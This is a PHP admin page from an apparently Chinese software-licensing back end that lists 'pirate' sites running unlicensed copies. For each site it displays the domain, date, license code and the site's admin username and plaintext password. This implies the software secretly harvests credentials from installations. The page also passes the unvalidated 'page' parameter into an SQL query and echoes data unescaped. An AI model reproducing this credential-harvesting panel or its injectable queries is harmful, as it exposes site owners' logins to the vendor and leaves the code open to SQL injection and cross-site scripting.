<?php
/**
 * 盗版站点列表
**/
$mod='blank';
include("../includes/common.php");
$title='盗版站点列表';
include './head.php';
if($islogins==1){}else exit("<script language='javascript'>window.location.href='./login.php';</script>");
echo '<div class="col-xs-12 col-sm-10 col-lg-8 center-block" style="float: none;">';
$city=get_ip_city($clientip);
$DB->query("insert into `auth_log` (`uid`,`type`,`date`,`city`,`data`) values ('".代理.$user."','查看盗版列表','".$date."','".$city."','".$clientip."')");
if($udata['power'] =='5'){
	showmsg('您的账号没有权限使用此功能',3);
	exit;
}
?>
<?php
$blocks=$DB->count("SELECT count(*) from auth_block WHERE 1");
$pagesize=30;
if (!isset($_GET['page'])) {
	$page = 1;
	$pageu = $page - 1;
} else {
	$page = $_GET['page'];
	$pageu = ($page - 1) * $pagesize;
}

if(isset($_POST['qq']) && isset($_POST['url'])){
} ?>
			<div class="block">
				<div class="block-title">
					<h3 class="panel-title">盗版站点列表</h4><b>共有<?=$blocks?>个盗版 </b></div>
				  					<div class="table-responsive">
                    <table class="table">
          <thead><tr><th>域名</th><th>时间</th><th>账号</th><th>密码</th><th>状态</th><th>操作</th></tr></thead>
          <tbody>
<?php
$rs=$DB->query("SELECT * FROM auth_block order by date desc limit $pageu,$pagesize");
while($res = $DB->fetch($rs))
{
$type='<font color="orange">正常</font>';
$url=urlencode($res['url']);
$db=$DB->get_row("SELECT * FROM auth_block WHERE url='$url' limit 1");
echo '<tr><td><a href="../api/jump.php?url='.urlencode('http://'.$res['url'].'/').'" target="_blank">'.$res['url'].'</a>&nbsp;<a href="../api/jump.php?url='.urlencode('http://'.$res['url'].':3312').'" target="_blank"></a></td><td>'.$res['date'].'</td><td>'.$db['admin_user'].'</td><td>'.$db['admin_pass'].'</td><td onclick="alert(\'授权码：'.$res['authcode'].'\')">'.$type.'</td><td><a href="./getpwd.php?url='.$url.'&m=1" class="btn btn-xs btn-primary">基本信息</a>&nbsp;<a href="./edit.php?my=delpirate&url='.$res['url'].'" class="btn btn-xs btn-danger" onclick="return confirm(\'你确实要删除此条记录吗？\');">删除</a></td></tr>';
}
?>
          </tbody>
        </table>
      </div>
<?php
echo'<ul class="pagination">';
$s = ceil($blocks / $pagesize);
$first=1;
$prev=$page-1;
$next=$page+1;
$last=$s;
if ($page>1)
{
echo '<li><a href="pirate.php?page='.$first.$link.'">首页</a></li>';
echo '<li><a href="pirate.php?page='.$prev.$link.'">&laquo;</a></li>';
} else {
echo '<li class="disabled"><a>首页</a></li>';
echo '<li class="disabled"><a>&laquo;</a></li>';
}
for ($i=1;$i<$page;$i++)
echo '<li><a href="pirate.php?page='.$i.$link.'">'.$i .'</a></li>';
echo '<li class="disabled"><a>'.$page.'</a></li>';
for ($i=$page+1;$i<=$s;$i++)
echo '<li><a href="pirate.php?page='.$i.$link.'">'.$i .'</a></li>';
echo '';
if ($page<$s)
{
echo '<li><a href="pirate.php?page='.$next.$link.'">&raquo;</a></li>';
echo '<li><a href="pirate.php?page='.$last.$link.'">尾页</a></li>';
} else {
echo '<li class="disabled"><a>&raquo;</a></li>';
echo '<li class="disabled"><a>尾页</a></li>';
}
echo'</ul>';
#分页
?>
    </div>
  </div>
    